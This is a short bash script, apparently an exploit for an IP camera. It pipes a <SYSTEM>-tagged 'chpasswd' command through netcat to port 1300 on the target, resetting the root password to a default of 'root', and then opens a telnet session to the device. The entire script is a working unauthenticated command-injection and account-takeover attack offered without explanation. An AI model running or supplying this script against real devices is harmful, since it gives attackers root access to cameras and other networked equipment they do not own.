#!/bin/bash
ip="${1:-ipcam1}"
port="${2:-1300}"
new_password="${3:-root}"

response=$(echo "<SYSTEM>echo \"root:$new_password\" | chpasswd</SYSTEM>" | nc "$ip" "$port");
echo "$response"
telnet $ip 
